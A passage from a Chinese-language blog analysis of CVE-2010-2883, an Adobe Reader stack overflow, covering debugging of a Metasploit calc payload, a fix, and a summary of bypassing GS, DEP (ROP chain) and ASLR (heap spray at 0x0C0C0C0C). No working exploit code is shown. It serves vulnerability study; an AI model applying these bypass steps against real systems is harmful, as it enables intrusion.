<h2 id="6-3-执行shellcode"><a href="#6-3-执行shellcode" class="headerlink" title="6.3-执行shellcode"></a>6.3-执行shellcode</h2><ul>
<li><p>执行memcpy后，目的地填充为shellcode，下内存访问断点，可何时访问</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135323.jpg" alt="image-20200109213223462"></p>
</li>
<li><p>F9执行，发现会有解密操作，原因是exploit脚本中对js进行了加密</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135325.jpg" alt="image-20200109213458312"></p>
</li>
<li><p>取消断点，循环解密后F2，使其完成解密，此时发现shellcode中出现字符串“cacl.exe”，正是msf中设置的c++属性，即payload-Windows/exec要执行的计算器程序</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135316.jpg" alt="image-20200109213817626"></p>
</li>
<li><p>Windows/exec会调用系统API：WinExec，ctrl+g搜索并下断，执行至此，发现确实是计算器程序（若设置的payload为meterpreter，则是建立网络链接去反向连接攻击者</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135330.jpg" alt="image-20200109213952791"></p>
</li>
<li><p>F9放行，成功弹出计算器，即成功执行payload，大功告成！</p>
</li>
</ul>
<h1 id="07-修复方案"><a href="#07-修复方案" class="headerlink" title="07-修复方案"></a>07-修复方案</h1><ul>
<li>归根结底，是因为strcat执行前没有检查输入长度，使得大小不固定的空间可被复制到具有固定大小的栈空间中</li>
<li>在执行strcat前，先strlen判定一下长度，再进行操作</li>
<li>或者直接使用strncat限定长度来进行字符串拼接</li>
</ul>
<h1 id="08-知识总结"><a href="#08-知识总结" class="headerlink" title="08-知识总结"></a>08-知识总结</h1><h2 id="8-1-绕过GS"><a href="#8-1-绕过GS" class="headerlink" title="8.1-绕过GS"></a>8.1-绕过GS</h2><ul>
<li><p>尽管通过安全cookie的检查，可以很好的探测栈是否被破坏/溢出；但是其也有很大弊端：只有在函数返回前，才会去检查security cookie，在之前是没有任何保护措施的</p>
</li>
<li><p>故只要在􏲐 Security Cookie被检查之前劫持程序流程，就可无视GS保护，如OD中所示，产生溢出后，下内存访问断点，会有call 栈内数据的操作，由此直接劫持程序流程，从而绕过GS</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-10-081309.jpg" alt="image-20200110154908752"></p>
</li>
</ul>
<h2 id="8-2-绕过DEP"><a href="#8-2-绕过DEP" class="headerlink" title="8.2-绕过DEP"></a>8.2-绕过DEP</h2><ul>
<li><p>通过构造ROP链，利用程序自身加载的库文件中的指令，来拼接出一系列指令去执行</p>
</li>
<li><p>如上述所言，构造的ROP链依次调用了：CreateFileA、CreateFileMapping、MapViewOfFile这些API，为进程申请了一块具有读写执行权限的共享内存空间；</p>
</li>
<li><p>进一步调用memcpy将shellcode复制到此空间，从而实现shellcode的执行，绕过DEP</p>
</li>
</ul>
<h2 id="8-3-绕过ASLR"><a href="#8-3-绕过ASLR" class="headerlink" title="8.3-绕过ASLR"></a>8.3-绕过ASLR</h2><ul>
<li>尽管开启ASLR后，其对堆基址做了随机化处理，但对于Heap Spray来说是无效的</li>
<li>不管怎样对堆基址进行随机化，其基址总会出现在较低的内存空间，远远小于堆喷射所需的0x0c0c0c0c地址，因此，Heap spray 完全可以绕过 ASLR </li>
</ul>
<h2 id="8-4-思路总结"><a href="#8-4-思路总结" class="headerlink" title="8.4-思路总结"></a>8.4-思路总结</h2><ol>
<li>构造恶意数据，实现栈溢出</li>
<li>函数返回前（安全cookie检查前），调用恶意数据中的地址，开始实施ROP</li>
<li>通过ROP，劫持执行流程指向0x0C0C0C0C</li>
<li>js堆喷射覆盖地址0x0C0C0C0C，从而执行另一块ROP</li>
<li>ROP块中为进程申请可执行权限的内存空间，并将shellcode复制其中</li>
<li>shellcode执行，成功利用！</li>
</ol>
<h1 id="09-参考文献"><a href="#09-参考文献" class="headerlink" title="09-参考文献"></a>09-参考文献</h1><ul>
<li>《漏洞战争》</li>
<li>《0day安全软件漏洞分析技术》</li>
<li>《Metasploit渗透测试魔鬼训练营》</li>
</ul>
<p>首发于看雪论坛：<a href="https://bbs.pediy.com/thread-257172.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257172.htm</a></p>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>21Guns
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://21guns.top/2020/01/11/reverse/cve-2010-2883漏洞分析（栈溢出）/" title="cve-2010-2883漏洞分析（栈溢出）">http://21guns.top/2020/01/11/reverse/cve-2010-2883漏洞分析（栈溢出）/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/漏洞分析/" rel="tag"># 漏洞分析</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2019/11/29/reverse/熊猫烧香病毒分析/" rel="prev" title="熊猫烧香病毒分析">
      <i class="fa fa-chevron-left"></i> 熊猫烧香病毒分析
    </a></div>
      <div class="post-nav-item">
    <a href="/2020/01/24/reverse/cve-2012-0003漏洞分析（堆溢出）/" rel="next" title="cve-2012-0003漏洞分析（堆溢出）">
      cve-2012-0003漏洞分析（堆溢出） <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#01-漏洞描述"><span class="nav-number">1.</span> <span class="nav-text">01-漏洞描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#02-测试环境"><span class="nav-number">2.</span> <span class="nav-text">02-测试环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#03-漏洞复现"><span class="nav-number">3.</span> <span class="nav-text">03-漏洞复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#04-准备工作"><span class="nav-number">4.</span> <span class="nav-text">04-准备工作</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1-漏洞定位-基于字符串"><span class="nav-number">4.1.</span> <span class="nav-text">4.1-漏洞定位-基于字符串</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2-判定安全机制"><span class="nav-number">4.2.</span> <span class="nav-text">4.2-判定安全机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-3-SING表结构分析"><span class="nav-number">4.3.</span> <span class="nav-text">4.3-SING表结构分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-4-JS堆喷射代码"><span class="nav-number">4.4.</span> <span class="nav-text">4.4-JS堆喷射代码</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#05-Exploit脚本分析"><span class="nav-number">5.</span> <span class="nav-text">05-Exploit脚本分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#5-1-exploit"><span class="nav-number">5.1.</span> <span class="nav-text">5.1-exploit()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-2-make-ttf"><span class="nav-number">5.2.</span> <span class="nav-text">5.2-make_ttf()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-3-make-js"><span class="nav-number">5.3.</span> <span class="nav-text">5.3-make_js()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-4-make-pdf"><span class="nav-number">5.4.</span> <span class="nav-text">5.4-make_pdf()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#06-OD动态调试"><span class="nav-number">6.</span> <span class="nav-text">06-OD动态调试</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#6-1-产生溢出"><span class="nav-number">6.1.</span> <span class="nav-text">6.1-产生溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-2-ROP绕DEP"><span class="nav-number">6.2.</span> <span class="nav-text">6.2-ROP绕DEP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-3-执行shellcode"><span class="nav-number">6.3.</span> <span class="nav-text">6.3-执行shellcode</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#07-修复方案"><span class="nav-number">7.</span> <span class="nav-text">07-修复方案</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#08-知识总结"><span class="nav-number">8.</span> <span class="nav-text">08-知识总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#8-1-绕过GS"><span class="nav-number">8.1.</span> <span class="nav-text">8.1-绕过GS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-2-绕过DEP"><span class="nav-number">8.2.</span> <span class="nav-text">8.2-绕过DEP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-3-绕过ASLR"><span class="nav-number">8.3.</span> <span class="nav-text">8.3-绕过ASLR</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-4-思路总结"><span class="nav-number">8.4.</span> <span class="nav-text">8.4-思路总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#09-参考文献"><span class="nav-number">9.</span> <span class="nav-text">09-参考文献</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="21Guns" src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">21Guns</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">164</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">71</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="vx:lxllxllx1" title="Wechat → vx:lxllxllx1" rel="noopener" target="_blank"><i class="fab fa-weixin fa-fw"></i>Wechat</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://github.com/21Gun5" title="GitHub → https://github.com/21Gun5" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2016 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">21Guns</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
<script src="/js/schemes/pisces.js"></script>
<script src="/js/next-boot.js"></script>



  




  <script src="/js/local-search.js"></script>












  

  

</body>
</html>
